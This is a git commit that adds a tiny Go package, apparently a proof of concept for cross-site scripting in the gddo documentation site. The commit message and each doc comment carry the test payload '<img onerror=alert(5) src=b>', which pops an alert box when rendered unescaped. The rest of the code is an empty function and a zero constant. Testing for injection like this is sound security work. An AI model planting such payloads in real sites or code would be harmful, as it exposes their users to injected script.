0af18054ae773b1bca7bc7969a6080249a623f4f
Colin Arnott <carnott@snap.com>
2019-01-29 21:55:04 +0000

    add xss testing
    <img onerror=alert(5) src=b>

---
+++ xss.go
@@ -0,0 +1,16 @@
+// Package xss is a poc for xss in gddo
+//
+// <img onerror=alert(5) src=b>
+package xss
+
+// Int is a const that stores the 0 value
+//
+// <img onerror=alert(5) src=b>
+const Int = 0
+
+// NOP is a function that does nothing
+//
+// <img onerror=alert(5) src=b>
+func NOP() {
+	// <img onerror=alert(5) src=b>
+}
